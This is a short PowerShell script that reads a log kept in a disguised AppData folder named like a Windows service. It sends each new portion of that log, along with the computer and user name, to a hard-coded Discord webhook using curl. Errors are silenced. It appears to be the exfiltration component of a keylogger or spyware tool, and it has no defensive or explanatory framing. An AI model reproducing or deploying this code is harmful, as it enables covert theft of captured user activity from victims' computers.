$ErrorActionPreference = "SilentlyContinue"
$hook = "https://discord.com/api/webhooks/1574502039323545742/FGJ91Pysy7zdQwD64rLOfrSyMa9-c5o-g8_29n5sEqzLr2KS96o9sWrPx5Zp7uY3ukUt"
$dir  = "$env:APPDATA\Microsoft\WinSvc"
$log  = "$dir\svc.log"; $posF = "$dir\pos.txt"

if (-not (Test-Path $log)) { exit }
$pos = 0; if (Test-Path $posF) { $pos = [int](Get-Content $posF) }
$a = Get-Content $log -Raw
if (-not $a -or $a.Length -le $pos) { exit }

$f = "$env:TEMP\s_$(Get-Date -f yyyyMMdd_HHmmss).txt"
$a.Substring($pos) | Set-Content $f -Encoding UTF8
curl.exe -s -F "content=**$env:COMPUTERNAME** / $env:USERNAME — sessao terminada" -F "files[0]=@$f" $hook
Set-Content $posF $a.Length
